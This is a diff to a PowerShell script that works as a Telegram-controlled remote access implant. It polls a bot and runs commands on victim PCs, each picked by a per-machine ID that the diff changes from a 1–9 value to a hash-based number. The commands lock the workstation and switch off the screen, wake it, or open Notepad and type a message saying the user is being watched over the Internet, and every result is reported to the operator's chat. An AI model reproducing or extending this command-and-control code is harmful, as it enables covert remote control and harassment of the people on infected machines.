@@ -65,17 +65,15 @@ while ($true) {
                     $IDDestino = [string]$Partes[1]
                 }
 
+                # 🔥 NUEVO: CÁLCULO UNIFICADO DE ID ÚNICO DE 3 DÍGITOS (100 al 999) fijos por máquina
+                $Md5 = [System.Security.Cryptography.MD5]::Create()
+                $HashBytes = $Md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($MiPC))
+                $IdUnico = ([BitConverter]::ToUInt16($HashBytes, 0) % 900) + 100
+                $MiIDNum = [string]$IdUnico
+
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
-                    # Calcula un ID del 1 al 9 único y fijo para esta PC según su nombre
-                    $LetrasPC = [char[]]$MiPC
-                    $TotalAscii = 0
-                    foreach ($Letra in $LetrasPC) { $TotalAscii += [int]$Letra }
-                    $Seed = $TotalAscii % 9
-                    if ($Seed -eq 0) { $Seed = 1 }
-                    $NumAsignado = [string]$Seed
-
-                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $NumAsignado + "] -> " + $User + "@" + $MiPC
+                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                     continue
                 }
@@ -90,19 +88,11 @@ while ($true) {
                                   "• /pantalla_off [Numero]`n" +
                                   "• /pantalla_on [Numero]`n" +
                                   "• /notepad [Numero]`n`n" +
-                                  "Ejemplo de uso: /notepad 1"
+                                  "Ejemplo de uso: /notepad " + $MiIDNum
                     
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                     continue
                 }
-
-                # CALCULAR MI PROPIO ID PARA COMPARAR
-                $MisLetras = [char[]]$MiPC
-                $MiAscii = 0
-                foreach ($M in $MisLetras) { $MiAscii += [int]$M }
-                $MiSeed = $MiAscii % 9
-                if ($MiSeed -eq 0) { $MiSeed = 1 }
-                $MiIDNum = [string]$MiSeed
 
                 # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                 if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
@@ -112,19 +102,19 @@ while ($true) {
                             $rundll = New-Object -ComObject WScript.Shell
                             $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
                             [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
                         }
                         "/pantalla_on" {
                             $wsh = New-Object -ComObject WScript.Shell
                             $wsh.SendKeys("{SHIFT}")
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                         }
                         "/notepad" {
-                            notepad.exe
+                            Start-Process "notepad.exe"
                             Start-Sleep -Milliseconds 500
                             $wsh = New-Object -ComObject WScript.Shell
                             $wsh.SendKeys("Te estoy observando por Internet... 👀")
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                         }
                     }
                 }
@@ -135,4 +125,3 @@ while ($true) {
     }
     Start-Sleep -Seconds 2
 }
-
